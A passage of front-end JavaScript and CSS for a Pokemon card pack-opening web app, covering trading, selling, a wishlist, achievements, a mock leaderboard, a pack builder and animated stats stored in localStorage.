            allCards.slice(0, 20).forEach(card => {
                if (userCardNames.has(card.name)) return; // Don't show cards user already owns
                
                const cardEl = document.createElement('div');
                cardEl.className = 'trade-card-item';
                cardEl.onclick = () => selectTradeCard(card);
                cardEl.innerHTML = `
                    <div class="trade-card-item-name">${card.name}</div>
                    <div class="trade-card-item-price">${card.price}</div>
                `;
                container.appendChild(cardEl);
            });
        }
        
        let selectedTradeCard = null;
        
        function selectTradeCard(card) {
            selectedTradeCard = card;
            document.querySelectorAll('.trade-card-item').forEach(el => el.classList.remove('selected'));
            event.target.closest('.trade-card-item').classList.add('selected');
        }
        
        function searchTradeCards(query) {
            const container = document.getElementById('tradeCardsList');
            const items = container.querySelectorAll('.trade-card-item');
            items.forEach(item => {
                const name = item.querySelector('.trade-card-item-name').textContent.toLowerCase();
                if (name.includes(query.toLowerCase())) {
                    item.style.display = 'block';
                } else {
                    item.style.display = 'none';
                }
            });
        }
        
        function createTradeOffer(offeredCardName) {
            if (!selectedTradeCard) {
                showNotification('Please select a card to trade for', 'error');
                return;
            }
            
            const offer = {
                id: Date.now(),
                offeredCard: offeredCardName,
                requestedCard: selectedTradeCard.name,
                status: 'pending',
                createdAt: new Date().toISOString()
            };
            
            tradeOffers.push(offer);
            localStorage.setItem('tradeOffers', JSON.stringify(tradeOffers));
            showNotification('Trade offer created!', 'success');
            closeModal('tradeModal');
        }
        
        // ============================================
        // SELLING SYSTEM
        // ============================================
        
        function sellCard(cardName) {
            const card = userCollection.find(c => c.name === cardName);
            if (!card) return;
            
            const price = parseFloat((card.price || '$0').replace(/[^0-9.]/g, '')) || 0;
            const sellPrice = (price * 0.85).toFixed(2); // 85% buyback
            
            if (confirm(`Sell ${cardName} for $${sellPrice}? (85% of market value)`)) {
                userCollection = userCollection.filter(c => c.name !== cardName);
                localStorage.setItem('userCollection', JSON.stringify(userCollection));
                
                // Add to wallet
                let wallet = parseFloat(localStorage.getItem('userWallet') || '0');
                wallet += parseFloat(sellPrice);
                localStorage.setItem('userWallet', wallet.toString());
                
                updateCollectionStats();
                updateWalletDisplay();
                generateCollectionPage();
                showNotification(`Sold for $${sellPrice}`, 'success');
            }
        }
        
        function updateWalletDisplay() {
            const wallet = parseFloat(localStorage.getItem('userWallet') || '0');
            const walletElements = document.querySelectorAll('.wallet-amount');
            walletElements.forEach(el => {
                el.textContent = `$${wallet.toFixed(2)}`;
            });
        }
        
        // ============================================
        // WISHLIST SYSTEM
        // ============================================
        
        let wishlist = JSON.parse(localStorage.getItem('wishlist') || '[]');
        
        function addToWishlist(cardName) {
            if (wishlist.find(c => c.name === cardName)) {
                showNotification('Card already in wishlist', 'info');
                return;
            }
            
            const card = (fetchedCards || pokemonCards).find(c => c.name === cardName);
            if (card) {
                wishlist.push({...card, addedAt: new Date().toISOString()});
                localStorage.setItem('wishlist', JSON.stringify(wishlist));
                showNotification('Added to wishlist', 'success');
            }
        }
        
        function showWishlistPage() {
            showPage('wishlist');
        }
        
        function generateWishlistPage() {
            const container = document.getElementById('wishlistGrid');
            if (!container) return;
            
            container.innerHTML = '';
            
            if (wishlist.length === 0) {
                container.innerHTML = `
                    <div style="grid-column: 1/-1; text-align: center; padding: 60px; color: var(--gray);">
                        <div style="font-size: 48px; margin-bottom: 20px;">â­</div>
                        <div style="font-size: 14px;">Your wishlist is empty</div>
                    </div>
                `;
                return;
            }
            
            wishlist.forEach((card, index) => {
                const cardEl = document.createElement('div');
                cardEl.className = 'wishlist-card';
                const randomColor = `hsl(${Math.random() * 360}, 70%, 50%)`;
                const imageStyle = card.image 
                    ? `background-image: url('${card.image}'); background-size: cover;`
                    : `background: linear-gradient(135deg, ${randomColor}22 0%, ${randomColor}88 100%);`;
                
                cardEl.innerHTML = `
                    <div class="wishlist-card-image" style="${imageStyle}"></div>
                    <div class="wishlist-card-name">${card.name}</div>
                    <div class="wishlist-card-price">${card.price}</div>
                    <button class="wishlist-remove-btn" onclick="removeFromWishlist('${card.name.replace(/'/g, "\\'")}')">Remove</button>
                `;
                container.appendChild(cardEl);
            });
        }
        
        function removeFromWishlist(cardName) {
            wishlist = wishlist.filter(c => c.name !== cardName);
            localStorage.setItem('wishlist', JSON.stringify(wishlist));
            generateWishlistPage();
            showNotification('Removed from wishlist', 'info');
        }
        
        // ============================================
        // NOTIFICATION SYSTEM
        // ============================================
        
        function showNotification(message, type = 'info') {
            const notification = document.createElement('div');
            notification.className = `notification-toast notification-${type}`;
            notification.innerHTML = `
                <div class="notification-content">
                    <span class="notification-icon">${type === 'success' ? 'âœ“' : type === 'error' ? 'âœ—' : 'â„¹'}</span>
                    <span class="notification-message">${message}</span>
                </div>
            `;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.classList.add('show');
            }, 10);
            
            setTimeout(() => {
                notification.classList.remove('show');
                setTimeout(() => notification.remove(), 300);
            }, 3000);
        }
        
        // ============================================
        // STATISTICS DASHBOARD
        // ============================================
        
        function showStatsPage() {
            showPage('stats');
        }

        function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
        function formatNumber(val, format) {
            const num = Number(val);
            if (!isFinite(num)) return String(val);
            if (format === 'currency') return '$' + num.toFixed(2);
            if (format === 'int') return Math.round(num).toString();
            return num.toString();
        }
        function animateNumber(el, to, { duration = 700, format = 'int' } = {}) {
            if (!el) return;
            const hasCurrent = Object.prototype.hasOwnProperty.call(el.dataset, 'current');
            const from = hasCurrent ? parseFloat(el.dataset.current || '0') : 0;
            const target = Number(to);
            if (!isFinite(target)) { el.textContent = formatNumber(to, format); return; }
            const start = performance.now();
            function tick(now) {
                const t = Math.min((now - start) / duration, 1);
                const v = (isFinite(from) ? from : 0) + (target - (isFinite(from) ? from : 0)) * easeOutCubic(t);
                el.textContent = formatNumber(v, format);
                if (t < 1) requestAnimationFrame(tick);
                else el.dataset.current = String(target);
            }
            requestAnimationFrame(tick);
        }
        function animateLiveCounter(node, to, template) {
            if (!node) return;
            const from = parseFloat(node.dataset.liveValue || String(to));
            const target = Number(to);
            const start = performance.now();
            const duration = 600;
            function tick(now) {
                const t = Math.min((now - start) / duration, 1);
                const v = Math.round((isFinite(from) ? from : target) + (target - (isFinite(from) ? from : target)) * easeOutCubic(t));
                node.textContent = template(v);
                if (t < 1) requestAnimationFrame(tick);
                else node.dataset.liveValue = String(target);
            }
            requestAnimationFrame(tick);
        }
        function setStatValue(el, value, format = 'int', animate = true) {
            if (!el) return;
            el.dataset.value = value;
            el.dataset.format = format;
            if (animate) animateNumber(el, value, { format });
            else { el.textContent = formatNumber(value, format); el.dataset.current = String(value); }
        }
        let statLiveTimer = null;
        function animateStatNumbers(root) {
            if (!root) return;
            root.querySelectorAll('[data-value]').forEach(el => {
                const val = parseFloat(el.dataset.value);
                if (!isFinite(val)) return;
                animateNumber(el, val, { format: el.dataset.format || 'int' });
            });
        }
        function startLiveStatTicker(root) {
            if (!root) return;
            const items = Array.from(root.querySelectorAll('[data-live="true"]'));
            if (!items.length) return;
            items.forEach(el => { if (!el.dataset.liveBase) el.dataset.liveBase = el.dataset.value; });
            const update = () => {
                items.forEach(el => {
                    const base = parseFloat(el.dataset.liveBase || el.dataset.value || '0');
                    if (!isFinite(base)) return;
                    const format = el.dataset.format || 'int';
                    const delta = format === 'currency'
                        ? (Math.random() * 40 - 20)
                        : Math.round(Math.random() * 3 - 1);
                    const next = Math.max(0, base + delta);
                    el.dataset.liveBase = String(next);
                    animateNumber(el, next, { format });
                });
                const nextDelay = 10000 + Math.floor(Math.random() * 10000);
                statLiveTimer = setTimeout(update, nextDelay);
            };
            if (statLiveTimer) clearTimeout(statLiveTimer);
            update();
        }
        
        function generateStatsPage() {
            const container = document.getElementById('statsContainer');
            if (!container) return;
            
            const packsOpened = parseInt(localStorage.getItem('packsOpened') || '0');
            const totalSpent = parseFloat(localStorage.getItem('totalSpent') || '0');
            const totalEarned = parseFloat(localStorage.getItem('totalEarned') || '0');
            const rarestCard = userCollection.reduce((rarest, card) => {
                const price = parseFloat((card.price || '$0').replace(/[^0-9.]/g, '')) || 0;
                const rarestPrice = parseFloat((rarest?.price || '$0').replace(/[^0-9.]/g, '')) || 0;
                return price > rarestPrice ? card : rarest;
            }, null);
            
            container.innerHTML = `
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-card-icon"><img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;"></div>
                        <div class="stat-card-value" data-value="${packsOpened}" data-format="int" data-live="true">${packsOpened}</div>
                        <div class="stat-card-label">Packs Opened</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-icon">ðŸ’³</div>
                        <div class="stat-card-value" data-value="${totalSpent.toFixed(2)}" data-format="currency" data-live="true">$${totalSpent.toFixed(2)}</div>
                        <div class="stat-card-label">Total Spent</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-icon">ðŸ’°</div>
                        <div class="stat-card-value" data-value="${totalEarned.toFixed(2)}" data-format="currency" data-live="true">$${totalEarned.toFixed(2)}</div>
                        <div class="stat-card-label">Total Earned</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-icon">â­</div>
                        <div class="stat-card-value" data-value="${userStats.uniqueCards || 0}" data-format="int" data-live="true">${userStats.uniqueCards || 0}</div>
                        <div class="stat-card-label">Unique Cards</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-icon">ðŸ’Ž</div>
                        <div class="stat-card-value">${rarestCard ? rarestCard.name : 'None'}</div>
                        <div class="stat-card-label">Rarest Card</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-card-icon">ðŸ“Š</div>
                        <div class="stat-card-value" data-value="${(userStats.totalValue || 0).toFixed(2)}" data-format="currency" data-live="true">$${(userStats.totalValue || 0).toFixed(2)}</div>
                        <div class="stat-card-label">Collection Value</div>
                    </div>
                </div>
                <div class="stats-charts">
                    <div class="chart-container">
                        <h3>Rarity Distribution</h3>
                        <canvas id="rarityChart"></canvas>
                    </div>
                    <div class="chart-container">
                        <h3>Collection Growth</h3>
                        <canvas id="growthChart"></canvas>
                    </div>
                </div>
            `;
            animateStatNumbers(container);
            startLiveStatTicker(container);
            generateCharts();
        }
        
        function generateCharts() {
            // Rarity distribution
            const rarityCounts = {};
            userCollection.forEach(card => {
                const rarity = card.rarity || 'Common';
                rarityCounts[rarity] = (rarityCounts[rarity] || 0) + (card.quantity || 1);
            });
            
            // Simple text-based chart
            const chartContainer = document.querySelector('#rarityChart');
            if (chartContainer) {
                chartContainer.innerHTML = Object.entries(rarityCounts).map(([rarity, count]) => `
                    <div class="chart-bar">
                        <div class="chart-label">${rarity}</div>
                        <div class="chart-bar-fill" style="width: ${(count / userCollection.length) * 100}%"></div>
                        <div class="chart-value">${count}</div>
                    </div>
                `).join('');
            }
        }
        
        // ============================================
        // PACK HISTORY
        // ============================================
        
        let packHistory = JSON.parse(localStorage.getItem('packHistory') || '[]');
        
        function addToPackHistory(packData, cards) {
            packHistory.unshift({
                pack: packData,
                cards: cards,
                openedAt: new Date().toISOString(),
                totalValue: cards.reduce((sum, card) => {
                    const price = parseFloat((card.price || '$0').replace(/[^0-9.]/g, '')) || 0;
                    return sum + price;
                }, 0)
            });
            
            // Keep only last 50 packs
            if (packHistory.length > 50) {
                packHistory = packHistory.slice(0, 50);
            }
            
            localStorage.setItem('packHistory', JSON.stringify(packHistory));
            
            // Update stats
            const packsOpened = parseInt(localStorage.getItem('packsOpened') || '0') + 1;
            localStorage.setItem('packsOpened', packsOpened.toString());
        }
        
        function showPackHistoryPage() {
            showPage('pack-history');
        }
        
        function generatePackHistoryPage() {
            const container = document.getElementById('packHistoryList');
            if (!container) return;
            
            container.innerHTML = '';
            
            if (packHistory.length === 0) {
                container.innerHTML = `
                    <div style="text-align: center; padding: 60px; color: var(--gray);">
                        <div style="font-size: 48px; margin-bottom: 20px;">ðŸ“œ</div>
                        <div style="font-size: 14px;">No pack history yet</div>
                    </div>
                `;
                return;
            }
            
            packHistory.forEach((entry, index) => {
                const entryEl = document.createElement('div');
                entryEl.className = 'pack-history-entry';
                entryEl.innerHTML = `
                    <div class="pack-history-header">
                        <div class="pack-history-pack-name">${entry.pack.name || 'Mystery Pack'}</div>
                        <div class="pack-history-date">${new Date(entry.openedAt).toLocaleString()}</div>
                    </div>
                    <div class="pack-history-value">Total Value: $${entry.totalValue.toFixed(2)}</div>
                    <div class="pack-history-cards">
                        ${entry.cards.slice(0, 5).map(card => `
                            <div class="pack-history-card">
                                <div class="pack-history-card-name">${card.name}</div>
                                <div class="pack-history-card-rarity ${(card.rarity || 'Common').toLowerCase().replace(' ', '-')}">${card.rarity || 'Common'}</div>
                            </div>
                        `).join('')}
                        ${entry.cards.length > 5 ? `<div class="pack-history-more">+${entry.cards.length - 5} more</div>` : ''}
                    </div>
                `;
                container.appendChild(entryEl);
            });
        }
        
        // Update pack opening to save history
        const originalShowPackResults = showPackResults;
        showPackResults = function(cards) {
            if (currentPackOpening) {
                addToPackHistory(currentPackOpening, cards);
            }
            originalShowPackResults(cards);
        };
        
        // ============================================
        // ACHIEVEMENTS SYSTEM
        // ============================================
        
        let achievements = JSON.parse(localStorage.getItem('achievements') || '[]');
        const achievementDefinitions = [
            { id: 'first_pack', name: 'First Pack', description: 'Open your first pack', icon: 'ðŸŽ', unlocked: false },
            { id: 'ten_packs', name: 'Pack Master', description: 'Open 10 packs', icon: '<img src="https://i.postimg.cc/8PrjSd5W/minimalist-cartoon-style-illustration-cardboard-shipping-box-featuring-heavy-shading-staining-forced.png" style="height:2em;width:auto;vertical-align:middle;">', unlocked: false },
            { id: 'hundred_cards', name: 'Collector', description: 'Collect 100 cards', icon: '<img src="https://i.postimg.cc/k4XLQyZL/Cartoon-school-book-emoji-expression-damask-education-expressions-408403-wh1200-removebg-preview.png" style="height:32px;width:auto;vertical-align:middle;">', unlocked: false },
            { id: 'rare_pull', name: 'Lucky', description: 'Pull a rare card', icon: 'â­', unlocked: false },
            { id: 'ultra_rare', name: 'Ultra Lucky', description: 'Pull an ultra rare card', icon: 'ðŸ’Ž', unlocked: false },
            { id: 'thousand_value', name: 'Valuable', description: 'Collection worth $1000+', icon: 'ðŸ’°', unlocked: false },
            { id: 'first_trade', name: 'Trader', description: 'Complete your first trade', icon: 'ðŸ”„', unlocked: false },
            { id: 'mystery_master', name: 'Mystery Master', description: 'Open 5 mystery packs', icon: 'â“', unlocked: false }
        ];
        
        function checkAchievements() {
            const packsOpened = parseInt(localStorage.getItem('packsOpened') || '0');
            const totalCards = userStats.totalCards || 0;
            const totalValue = userStats.totalValue || 0;
            const tradesCompleted = parseInt(localStorage.getItem('tradesCompleted') || '0');
            const mysteryPacksOpened = parseInt(localStorage.getItem('mysteryPacksOpened') || '0');
            
            achievementDefinitions.forEach(achievement => {
                if (achievements.find(a => a.id === achievement.id)) return; // Already unlocked
                
                let shouldUnlock = false;
                
                switch(achievement.id) {
                    case 'first_pack':
                        shouldUnlock = packsOpened >= 1;
                        break;
                    case 'ten_packs':
                        shouldUnlock = packsOpened >= 10;
                        break;
                    case 'hundred_cards':
                        shouldUnlock = totalCards >= 100;
                        break;
                    case 'thousand_value':
                        shouldUnlock = totalValue >= 1000;
                        break;
                    case 'first_trade':
                        shouldUnlock = tradesCompleted >= 1;
                        break;
                    case 'mystery_master':
                        shouldUnlock = mysteryPacksOpened >= 5;
                        break;
                }
                
                if (shouldUnlock) {
                    unlockAchievement(achievement);
                }
            });
        }
        
        function unlockAchievement(achievement) {
            achievements.push({...achievement, unlockedAt: new Date().toISOString()});
            localStorage.setItem('achievements', JSON.stringify(achievements));
            showNotification(`Achievement Unlocked: ${achievement.name}!`, 'success');
            showAchievementPopup(achievement);
        }
        
        function showAchievementPopup(achievement) {
            const popup = document.createElement('div');
            popup.className = 'achievement-popup';
            popup.innerHTML = `
                <div class="achievement-popup-content">
                    <div class="achievement-popup-icon">${achievement.icon}</div>
                    <div class="achievement-popup-title">Achievement Unlocked!</div>
                    <div class="achievement-popup-name">${achievement.name}</div>
                    <div class="achievement-popup-desc">${achievement.description}</div>
                </div>
            `;
            document.body.appendChild(popup);
            
            setTimeout(() => {
                popup.classList.add('show');
            }, 10);
            
            setTimeout(() => {
                popup.classList.remove('show');
                setTimeout(() => popup.remove(), 500);
            }, 3000);
        }
        
        function showAchievementsPage() {
            showPage('achievements');
        }
        
        function generateAchievementsPage() {
            const container = document.getElementById('achievementsGrid');
            if (!container) return;
            
            container.innerHTML = '';
            
            // Update count
            const countEl = document.getElementById('achievementsCount');
            if (countEl) {
                countEl.textContent = achievements.length + ' / ' + achievementDefinitions.length + ' Unlocked';
            }
            
            achievementDefinitions.forEach(achievement => {
                const unlocked = achievements.find(a => a.id === achievement.id);
                const achievementEl = document.createElement('div');
                achievementEl.className = 'achievement-item ' + (unlocked ? 'unlocked' : 'locked');
                
                let dateHtml = '';
                if (unlocked) {
                    dateHtml = '<div class="achievement-date">Unlocked: ' + new Date(unlocked.unlockedAt).toLocaleDateString() + '</div>';
                }
                
                achievementEl.innerHTML = 
                    '<div class="achievement-icon">' + achievement.icon + '</div>' +
                    '<div class="achievement-name">' + achievement.name + '</div>' +
                    '<div class="achievement-description">' + achievement.description + '</div>' +
                    dateHtml;
                container.appendChild(achievementEl);
            });
        }
        
        // ============================================
        // LEADERBOARD SYSTEM
        // ============================================
        
        function showLeaderboardPage() {
            showPage('leaderboard');
        }
        
        function generateLeaderboardPage() {
            const container = document.getElementById('leaderboardList');
            if (!container) return;
            
            // Mock leaderboard data (in real app, fetch from server)
            const leaderboard = [
                { username: 'CardMaster99', collectionValue: 15420.50, packsOpened: 234, rank: 1 },
                { username: 'PokemonPro', collectionValue: 12890.30, packsOpened: 189, rank: 2 },
                { username: 'CollectorKing', collectionValue: 11250.75, packsOpened: 156, rank: 3 },
                { username: 'PackRipper', collectionValue: 9870.20, packsOpened: 145, rank: 4 },
                { username: 'RareHunter', collectionValue: 8650.40, packsOpened: 132, rank: 5 },
                { username: 'TradingPro', collectionValue: 7420.60, packsOpened: 118, rank: 6 },
                { username: 'CardDealer', collectionValue: 6890.80, packsOpened: 107, rank: 7 },
                { username: 'PackMaster', collectionValue: 6250.30, packsOpened: 98, rank: 8 },
                { username: 'CollectionGuru', collectionValue: 5890.50, packsOpened: 87, rank: 9 },
                { username: 'RipExpert', collectionValue: 5420.70, packsOpened: 76, rank: 10 }
            ];
            
            // Add current user
            const userRank = leaderboard.length + 1;
            const userEntry = {
                username: localStorage.getItem('username') || 'You',
                collectionValue: userStats.totalValue || 0,
                packsOpened: parseInt(localStorage.getItem('packsOpened') || '0'),
                rank: userRank,
                isCurrentUser: true
            };
            
            container.innerHTML = '';
            
            leaderboard.forEach((entry, index) => {
                const entryEl = document.createElement('div');
                entryEl.className = `leaderboard-entry ${entry.rank <= 3 ? 'top-three' : ''}`;
                entryEl.innerHTML = `
                    <div class="leaderboard-rank">#${entry.rank}</div>
                    <div class="leaderboard-user">
                        ${entry.rank === 1 ? 'ðŸ¥‡' : entry.rank === 2 ? 'ðŸ¥ˆ' : entry.rank === 3 ? 'ðŸ¥‰' : ''}
                        <span class="leaderboard-username">${entry.username}</span>
                    </div>
                    <div class="leaderboard-stats">
                        <div class="leaderboard-stat">
                            <span class="leaderboard-stat-label">Value:</span>
                            <span class="leaderboard-stat-value">$${entry.collectionValue.toFixed(2)}</span>
                        </div>
                        <div class="leaderboard-stat">
                            <span class="leaderboard-stat-label">Packs:</span>
                            <span class="leaderboard-stat-value">${entry.packsOpened}</span>
                        </div>
                    </div>
                `;
                container.appendChild(entryEl);
            });
            
            // Add user entry
            const userEl = document.createElement('div');
            userEl.className = 'leaderboard-entry current-user';
            userEl.innerHTML = `
                <div class="leaderboard-rank">#${userRank}</div>
                <div class="leaderboard-user">
                    <span class="leaderboard-username">${userEntry.username}</span>
                </div>
                <div class="leaderboard-stats">
                    <div class="leaderboard-stat">
                        <span class="leaderboard-stat-label">Value:</span>
                        <span class="leaderboard-stat-value">$${userEntry.collectionValue.toFixed(2)}</span>
                    </div>
                    <div class="leaderboard-stat">
                        <span class="leaderboard-stat-label">Packs:</span>
                        <span class="leaderboard-stat-value">${userEntry.packsOpened}</span>
                    </div>
                </div>
            `;
            container.appendChild(userEl);
        }
        
        // ============================================
        // PACK BUILDER / CUSTOM PACKS
        // ============================================
        
        function showPackBuilderPage() {
            showPage('pack-builder');
        }
        
        function generatePackBuilderPage() {
            const container = document.getElementById('packBuilderContainer');
            if (!container) return;
            
            container.innerHTML = `
                <div class="pack-builder-section">
                    <h2>Create Custom Pack</h2>
                    <div class="pack-builder-controls">
                        <div class="builder-control">
                            <label>Pack Name:</label>
                            <input type="text" id="customPackName" class="search-bar" placeholder="My Custom Pack">
                        </div>
                        <div class="builder-control">
                            <label>Number of Cards:</label>
                            <input type="number" id="customPackSize" value="10" min="5" max="20" class="quantity-input">
                        </div>
                        <div class="builder-control">
                            <label>Rarity Distribution:</label>
                            <div class="rarity-sliders">
                                <div class="rarity-slider">
                                    <label>Ultra Rare:</label>
                                    <input type="range" id="rarityUltraRare" min="0" max="5" value="1">
                                    <span id="rarityUltraRareValue">1</span>
                                </div>
                                <div class="rarity-slider">
                                    <label>Rare:</label>
                                    <input type="range" id="rarityRare" min="0" max="10" value="2">
                                    <span id="rarityRareValue">2</span>
                                </div>
                                <div class="rarity-slider">
                                    <label>Uncommon:</label>
                                    <input type="range" id="rarityUncommon" min="0" max="15" value="3">
                                    <span id="rarityUncommonValue">3</span>
                                </div>
                                <div class="rarity-slider">
                                    <label>Common:</label>
                                    <input type="range" id="rarityCommon" min="0" max="20" value="4">
                                    <span id="rarityCommonValue">4</span>
                                </div>
                            </div>
                        </div>
                        <button class="modal-btn" onclick="buildCustomPack()">Build Pack</button>
                    </div>
                </div>
                <div class="pack-builder-preview" id="packBuilderPreview"></div>
            `;
            
            // Update slider values
            ['UltraRare', 'Rare', 'Uncommon', 'Common'].forEach(rarity => {
                const slider = document.getElementById(`rarity${rarity}`);
                const valueDisplay = document.getElementById(`rarity${rarity}Value`);
                if (slider && valueDisplay) {
                    slider.addEventListener('input', (e) => {
                        valueDisplay.textContent = e.target.value;
                    });
                }
            });
        }
        
        function buildCustomPack() {
            const packName = document.getElementById('customPackName').value || 'Custom Pack';
            const ultraRare = parseInt(document.getElementById('rarityUltraRare').value);
            const rare = parseInt(document.getElementById('rarityRare').value);
            const uncommon = parseInt(document.getElementById('rarityUncommon').value);
            const common = parseInt(document.getElementById('rarityCommon').value);
            
            const packData = {
                name: packName,
                custom: true,
                rarityDistribution: { ultraRare, rare, uncommon, common }
            };
            
            currentPackOpening = packData;
            openPack(packData);
        }
        
        // ============================================
        // ADDITIONAL CSS FOR NEW FEATURES
        // ============================================
        
        const additionalStyles = `
            /* Pack Opening Animations */
            .pack-opening-container {
                width: 100%;
                max-width: 1200px;
                margin: 0 auto;
                padding: 40px;
            }
            
            .pack-opening-stage {
                min-height: 600px;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }
            
            .pack-wrapper {
                perspective: 1000px;
                margin-bottom: 30px;
            }
            
            .pack-3d {
                width: 200px;
                height: 280px;
                position: relative;
                transform-style: preserve-3d;
                cursor: pointer;
                transition: transform 0.3s ease;
            }
            
            .pack-3d:hover {
                transform: scale(1.1);
            }
            
            .pack-3d > div {
                position: absolute;
                width: 200px;
                height: 280px;
                border: 2px solid var(--green);
                background: linear-gradient(135deg, var(--green)22 0%, var(--green)88 100%);
            }
            
            .pack-front { transform: rotateY(0deg) translateZ(100px); }
            .pack-back { transform: rotateY(180deg) translateZ(100px); }
            .pack-top { transform: rotateX(90deg) translateZ(140px); height: 200px; }
            .pack-bottom { transform: rotateX(-90deg) translateZ(140px); height: 200px; }
            .pack-left { transform: rotateY(-90deg) translateZ(100px); width: 200px; }
            .pack-right { transform: rotateY(90deg) translateZ(100px); width: 200px; }
            
            @keyframes packOpen {
                0% { transform: scale(1) rotateY(0deg); }
                50% { transform: scale(1.2) rotateY(180deg); }
                100% { transform: scale(0) rotateY(360deg); opacity: 0; }
            }
            
            .pack-opening-text {
                font-size: 14px;
                color: var(--green);
                margin-top: 20px;
                animation: pulse 2s ease infinite;
            }
            
            .cards-reveal-container {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 20px;
                width: 100%;
                max-width: 1000px;
            }
            
            .revealed-card {
                aspect-ratio: 63/88;
                perspective: 1000px;
            }
            
            .card-flip-inner {
                position: relative;
                width: 100%;
                height: 100%;
                transform-style: preserve-3d;
                transition: transform 0.6s;
            }
            
            .card-flip-inner.flipped {
                transform: rotateY(180deg);
            }
            
            .card-flip-front,
            .card-flip-back {
                position: absolute;
                width: 100%;
                height: 100%;
                backface-visibility: hidden;
                border: 2px solid var(--green);
                border-radius: 8px;
            }
            
            .card-flip-back {
                transform: rotateY(180deg);
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                padding: 15px;
            }
            
            .card-rarity-badge {
                display: inline-block;
                padding: 4px 8px;
                font-size: 8px;
                border-radius: 4px;
                margin-bottom: 10px;
            }
            
            .card-rarity-badge.ultra-rare { background: gold; color: black; }
            .card-rarity-badge.rare { background: purple; color: white; }
            .card-rarity-badge.uncommon { background: blue; color: white; }
            .card-rarity-badge.common { background: gray; color: white; }
            
            .card-name-large {
                font-size: 12px;
                color: var(--white);
                margin-bottom: 10px;
            }
            
            .card-price-large {
                font-size: 14px;
                color: var(--green);
            }
            
            .pack-results {
                width: 100%;
                max-width: 1200px;
            }
            
            .results-title {
                font-size: 20px;
                color: var(--green);
                text-align: center;
                margin-bottom: 30px;
            }
            
            .results-stats {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 20px;
                margin-bottom: 40px;
            }
            
            .stat-item {
                text-align: center;
                padding: 20px;
                background: var(--dark-gray);
                border: 2px solid var(--green);
            }
            
            .stat-value {
                font-size: 24px;
                color: var(--green);
                margin-bottom: 10px;
            }
            
            .stat-label {
                font-size: 8px;
                color: var(--gray);
            }
            
            .results-cards-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
                gap: 15px;
                margin-bottom: 30px;
            }
            
            .result-card {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 10px;
                text-align: center;
            }
            
            .result-card-image {
                width: 100%;
                aspect-ratio: 63/88;
                background: var(--gray);
                border: 1px solid var(--green);
                margin-bottom: 10px;
            }
            
            .result-card-name {
                font-size: 8px;
                color: var(--white);
                margin-bottom: 5px;
            }
            
            .result-card-rarity {
                font-size: 7px;
                padding: 2px 6px;
                border-radius: 4px;
                margin-bottom: 5px;
            }
            
            .result-card-price {
                font-size: 10px;
                color: var(--green);
            }
            
            .results-actions {
                display: flex;
                gap: 15px;
                justify-content: center;
            }
            
            /* Collection Styles */
            .collection-card {
                position: relative;
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 15px;
                transition: all 0.3s ease;
            }
            
            .collection-card:hover {
                transform: translateY(-5px);
                border-color: var(--green-light);
                box-shadow: 0 10px 30px rgba(0, 255, 0, 0.3);
            }
            
            .card-quantity-badge {
                position: absolute;
                top: 10px;
                right: 10px;
                background: var(--green);
                color: var(--black);
                padding: 4px 8px;
                font-size: 8px;
                border-radius: 4px;
                z-index: 10;
            }
            
            .collection-card-image {
                width: 100%;
                aspect-ratio: 63/88;
                background: var(--gray);
                border: 1px solid var(--green);
                margin-bottom: 10px;
                cursor: pointer;
                transition: transform 0.3s ease;
            }
            
            .collection-card-image:hover {
                transform: scale(1.05);
            }
            
            .collection-card-name {
                font-size: 10px;
                color: var(--white);
                margin-bottom: 5px;
            }
            
            .collection-card-rarity {
                font-size: 8px;
                color: var(--gray);
                margin-bottom: 5px;
            }
            
            .collection-card-price {
                font-size: 12px;
                color: var(--green);
                margin-bottom: 10px;
            }
            
            .collection-card-actions {
                display: flex;
                gap: 5px;
                justify-content: center;
            }
            
            .collection-action-btn {
                background: var(--dark-gray);
                color: var(--green);
                border: 1px solid var(--green);
                padding: 6px 10px;
                font-size: 10px;
                cursor: pointer;
                transition: all 0.2s ease;
            }
            
            .collection-action-btn:hover {
                background: var(--green);
                color: var(--black);
            }
            
            /* Card Details Modal */
            .card-details-container {
                display: grid;
                grid-template-columns: 300px 1fr;
                gap: 30px;
            }
            
            .card-details-image {
                width: 100%;
                aspect-ratio: 63/88;
                background: var(--gray);
                border: 2px solid var(--green);
                border-radius: 8px;
            }
            
            .card-details-name {
                font-size: 18px;
                color: var(--white);
                margin-bottom: 15px;
            }
            
            .card-details-rarity {
                display: inline-block;
                padding: 6px 12px;
                font-size: 10px;
                border-radius: 4px;
                margin-bottom: 15px;
            }
            
            .card-details-price {
                font-size: 24px;
                color: var(--green);
                margin-bottom: 20px;
            }
            
            .card-details-stats {
                margin-bottom: 20px;
            }
            
            .detail-stat {
                display: flex;
                justify-content: space-between;
                padding: 8px 0;
                border-bottom: 1px solid var(--gray);
            }
            
            .detail-label {
                font-size: 8px;
                color: var(--gray);
            }
            
            .detail-value {
                font-size: 10px;
                color: var(--white);
            }
            
            .card-details-actions {
                display: flex;
                flex-direction: column;
                gap: 10px;
            }
            
            /* Trading Styles */
            .trade-container {
                display: grid;
                grid-template-columns: 1fr auto 1fr;
                gap: 30px;
                align-items: center;
                margin: 30px 0;
            }
            
            .trade-section {
                background: var(--dark-gray);
                border: 2px solid var(--green);
                padding: 20px;
                border-radius: 8px;
            }
            
            .trade-section h3 {
                font-size: 12px;
                color: var(--green);
                margin-bottom: 15px;
            }
            
            .trade-card-preview {
                background: var(--black);
                border: 1px solid var(--gray);
                padding: 15px;
                border-radius: 4px;
                margin-bottom: 15px;
            }
            
